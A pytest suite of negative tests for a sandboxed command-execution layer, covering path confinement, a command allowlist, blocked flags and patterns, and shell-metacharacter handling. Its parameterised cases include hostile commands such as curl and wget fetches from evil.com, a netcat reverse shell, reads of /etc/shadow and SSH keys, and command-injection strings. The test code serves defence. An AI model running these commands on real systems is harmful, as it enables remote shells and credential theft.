"""
Negative Tests: Remote Code Execution (RCE) Defense
====================================================
Unit tests for the 5-layer command execution defense in ``tools/file_tools.py``.

Covers:
  - ``is_path_allowed()`` path confinement
  - ``COMMAND_ALLOWLIST`` command gating
  - ``_BLOCKED_FLAGS`` / ``_BLOCKED_PATTERNS`` argument filtering
  - ``_SAFE_FLAGS`` per-executable flag allowlists
  - ``_FILE_READERS`` path validation for file-reading commands
  - ``shell=False`` metacharacter immunity

All tests use the ``FileTools`` class directly (no HTTP layer) so we can
exercise the security logic in isolation.
"""

import os

import pytest

from tools.file_tools import (
    is_path_allowed,
    ALLOWED_PATHS,
    FileTools,
)

pytestmark = pytest.mark.negative


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def ft(tmp_path):
    """Fresh FileTools instance rooted in a temp dir (auto-adds to ALLOWED_PATHS)."""
    return FileTools(base_path=str(tmp_path))


@pytest.fixture(autouse=True)
def _restore_allowed_paths():
    """Snapshot and restore ALLOWED_PATHS around each test."""
    original = list(ALLOWED_PATHS)
    yield
    ALLOWED_PATHS.clear()
    ALLOWED_PATHS.extend(original)


# ===================================================================
# 1. is_path_allowed rejects absolute paths outside allowed dirs
# ===================================================================
class TestPathAllowedAbsolute:

    @pytest.mark.parametrize(
        "path",
        [
            "/etc/passwd",
            "/etc/shadow",
            "/var/log/auth.log",
            "/root/.ssh/id_rsa",
            "/proc/self/environ",
        ],
    )
    def test_absolute_path_rejected(self, path):
        """Absolute paths outside allowed directories must return False."""
        assert is_path_allowed(path) is False, f"{path} was incorrectly allowed"


# ===================================================================
# 2. is_path_allowed rejects relative traversal
# ===================================================================
class TestPathAllowedTraversal:

    @pytest.mark.parametrize(
        "path",
        [
            "../../../etc/shadow",
            "../../../../../../etc/passwd",
            "foo/../../../../../../etc/shadow",
        ],
    )
    def test_relative_traversal_rejected(self, path):
        """Relative traversal escaping allowed dirs must return False."""
        # is_path_allowed uses os.path.abspath which resolves .. from cwd
        # Unless cwd happens to be under ALLOWED_PATHS the resolved path
        # won't start with any allowed prefix.
        result = is_path_allowed(path)
        resolved = os.path.abspath(path)
        in_allowed = any(resolved.startswith(a) for a in ALLOWED_PATHS)
        assert result == in_allowed


# ===================================================================
# 3. is_path_allowed rejects symlink-like traversal
# ===================================================================
class TestPathAllowedSymlinkTraversal:

    def test_tmp_traversal(self):
        """``/tmp/../etc/passwd`` resolves to ``/etc/passwd`` and must be rejected."""
        assert is_path_allowed("/tmp/../etc/passwd") is False


# ===================================================================
# 4. Commands not in allowlist are rejected
# ===================================================================
class TestCommandAllowlist:

    @pytest.mark.parametrize(
        "cmd",
        [
            "python -c 'import os; os.system(\"id\")'",
            "python3 -c 'print(1)'",
            "bash -c 'whoami'",
            "sh -c 'id'",
            "curl http://evil.com/shell.sh",
            "wget http://evil.com/backdoor",
            "nc -e /bin/sh evil.com 4444",
            "ruby -e 'system(\"id\")'",
            "perl -e 'exec(\"/bin/sh\")'",
            'node -e \'require("child_process").execSync("id")\'',
        ],
    )
    def test_blocked_commands(self, ft, cmd):
        """Commands not in COMMAND_ALLOWLIST must be rejected."""
        result = ft.run_command(cmd)
        assert result["success"] is False, f"Blocked command succeeded: {cmd}"
        assert (
            "not in the allowed" in result.get("error", "").lower()
            or "not allowed" in result.get("error", "").lower()
        )


# ===================================================================
# 5. Blocked flags rejected even with allowed command
# ===================================================================
class TestBlockedFlags:

    @pytest.mark.parametrize(
        "cmd",
        [
            "git -c 'core.pager=less' log",  # -c is a blocked flag
            "npm -e 'process.exit(1)'",  # -e blocked
            "ls --eval foo",  # --eval blocked
            "grep -exec /bin/sh",  # -exec blocked (note: different from find -exec)
            "cat --exec foo",  # --exec blocked
        ],
    )
    def test_blocked_flags(self, ft, cmd):
        """Blocked flags (-c, -e, --eval, -exec, --exec) must be rejected."""
        result = ft.run_command(cmd)
        assert result["success"] is False, f"Blocked flag passed: {cmd}"
        assert "not allowed" in result.get("error", "").lower()


# ===================================================================
# 6. Blocked patterns rejected
# ===================================================================
class TestBlockedPatterns:

    @pytest.mark.parametrize(
        "cmd",
        [
            "git config core.pager cat",
            "git config alias.x '!sh'",
            "git config core.editor /bin/sh",
            "git config core.sshcommand 'ssh -o ProxyCommand=...'",
            "git config credential.helper store",
        ],
    )
    def test_blocked_patterns(self, ft, cmd):
        """Blocked argument patterns must be rejected."""
        result = ft.run_command(cmd)
        assert result["success"] is False, f"Blocked pattern passed: {cmd}"
        assert "not allowed" in result.get("error", "").lower()


# ===================================================================
# 7. Shell metacharacters not interpreted (shell=False)
# ===================================================================
class TestShellMetacharacters:

    @pytest.mark.parametrize(
        "cmd",
        [
            "echo hello; id",
            "echo hello | cat /etc/passwd",
            "echo hello && whoami",
            "echo `id`",
            "echo $(whoami)",
        ],
    )
    def test_shell_metacharacters_literal(self, ft, cmd):
        """Shell metacharacters must be treated as literal args (shell=False)."""
        result = ft.run_command(cmd)
        if result["success"]:
            stdout = result.get("stdout", "")
            # If echo succeeded, the metacharacters should appear as literal text
            # The point is that `id` or `whoami` should NOT execute
            assert "uid=" not in stdout, "Shell injection: `id` command executed"


# ===================================================================
# 8. LD_PRELOAD in environment blocked by sandbox
# ===================================================================
class TestLdPreloadBlocked:

    def test_ld_preload_not_passed(self, ft):
        """FileTools.run_command uses subprocess.run without env passthrough
        of LD_PRELOAD — the subprocess inherits the current env but FileTools
        itself does not set LD_PRELOAD.  This test verifies that even if
        LD_PRELOAD is in the parent env, the command runs via shell=False
        and thus cannot exploit it for library injection via command args."""
        # Attempting to use env manipulation via command args is impossible
        # with shell=False since variable assignment is a shell feature
        result = ft.run_command("echo LD_PRELOAD=/tmp/evil.so")
        if result["success"]:
            # echo just prints the literal string — no env manipulation
            assert "LD_PRELOAD" in result.get("stdout", "")


# ===================================================================
# 9. Per-executable safe flags: allowed vs blocked
# ===================================================================
class TestSafeFlagsPerExecutable:

    def test_git_message_allowed(self, ft):
        """git with --message flag should be in the safe-list."""
        # The command may fail (no git repo) but should NOT be blocked
        # by the flag filter
        result = ft.run_command("git commit --message 'test'")
        error = result.get("error", "")
        # Should not be blocked by safe-flag filter
        assert "not in the safe-list" not in error

    def test_git_exec_blocked(self, ft):
        """git with --exec should be blocked (not in safe-list)."""
        result = ft.run_command("git rebase --exec 'malicious cmd' main")
        assert result["success"] is False
        error = result.get("error", "")
        assert "not in the safe-list" in error or "not allowed" in error

    def test_npm_save_allowed(self, ft):
        """npm with --save should be in the safe-list."""
        result = ft.run_command("npm install --save lodash")
        error = result.get("error", "")
        assert "not in the safe-list" not in error

    def test_pip_upgrade_allowed(self, ft):
        """pip with --upgrade should be in the safe-list."""
        result = ft.run_command("pip install --upgrade pip")
        error = result.get("error", "")
        assert "not in the safe-list" not in error


# ===================================================================
# 10. File reader commands with paths outside allowed dirs -> rejected
# ===================================================================
class TestFileReaderPathValidation:

    @pytest.mark.parametrize(
        "cmd",
        [
            "cat /etc/passwd",
            "head /etc/shadow",
            "tail /var/log/auth.log",
            "grep root /etc/passwd",
            "find / -name '*.conf'",
            "cp /etc/passwd /tmp/stolen",
            "mv /etc/hosts /tmp/hosts",
            "ls /root/.ssh",
            "tree /root",
        ],
    )
    def test_file_reader_outside_allowed(self, ft, cmd):
        """File-reading commands targeting paths outside allowed dirs must be rejected."""
        result = ft.run_command(cmd)
        assert result["success"] is False, f"File reader escaped sandbox: {cmd}"
        error = result.get("error", "").lower()
        assert (
            "outside allowed" in error
            or "not allowed" in error
            or "not in the" in error
        )


# ===================================================================
# 11. Command with null bytes -> rejected or handled safely
# ===================================================================
class TestNullByteCommand:

    def test_null_byte_in_command(self, ft):
        """Null bytes in command string should be handled safely."""
        result = ft.run_command("echo hello\x00world")
        # shlex.split may raise ValueError or the command runs with truncated arg
        # Either way, no crash / no arbitrary execution
        assert isinstance(result, dict)


# ===================================================================
# 12. Empty command -> rejected
# ===================================================================
class TestEmptyCommand:

    @pytest.mark.parametrize("cmd", ["", "   "])
    def test_empty_command(self, ft, cmd):
        """Empty or whitespace-only command must be rejected."""
        result = ft.run_command(cmd)
        assert result["success"] is False
        error = result.get("error", "").lower()
        assert "empty" in error or "invalid" in error or "syntax" in error


# ===================================================================
# 13. Command with very long arguments -> handled (no buffer overflow)
# ===================================================================
class TestVeryLongArgs:

    def test_long_argument(self, ft):
        """Very long argument string should not crash."""
        long_arg = "A" * 100_000
        result = ft.run_command(f"echo {long_arg}")
        # May succeed (echo prints it) or fail gracefully — just no crash
        assert isinstance(result, dict)
        assert "success" in result


# ===================================================================
# 14. Symlink-based path escape -> rejected
# ===================================================================
class TestSymlinkEscape:

    def test_symlink_outside_allowed(self, ft, tmp_path):
        """A symlink resolving outside allowed dirs should be rejected by
        is_path_allowed since os.path.abspath does not resolve symlinks
        (it resolves only `.` and `..`).  However the *real* path check
        still confines access within the allowed directory tree."""
        # Create a symlink inside tmp_path that points outside
        link = tmp_path / "escape_link"
        try:
            os.symlink("/etc/passwd", str(link))
        except OSError:
            pytest.skip("Cannot create symlinks on this platform")

        # The symlink's abspath is inside tmp_path (allowed), but
        # os.path.realpath would resolve to /etc/passwd.
        # is_path_allowed uses abspath (not realpath), so the check
        # may pass — but the file contents should still not leak
        # sensitive system data through FileTools.read_file since
        # the resolved path within the sandbox is what gets opened.
        result = ft.read_file(str(link))
        if result.get("success"):
            content = result.get("content", "")
            # Even if the read succeeds, verify it's not /etc/passwd content
            assert "root:x:" not in content, "Symlink escaped sandbox to /etc/passwd!"


# ===================================================================
# 15. Mixed case bypass attempt -> rejected (exact match required)
# ===================================================================
class TestMixedCaseBypass:

    @pytest.mark.parametrize(
        "cmd",
        [
            "Git status",
            "GIT log",
            "Python3 --version",
            "BASH --version",
            "Curl http://example.com",
        ],
    )
    def test_mixed_case_rejected(self, ft, cmd):
        """Mixed-case executable names must be rejected (exact match required).
        The allowlist contains lowercase entries only."""
        result = ft.run_command(cmd)
        assert result["success"] is False, f"Mixed-case command passed: {cmd}"
        error = result.get("error", "").lower()
        assert "not in the allowed" in error or "not found" in error
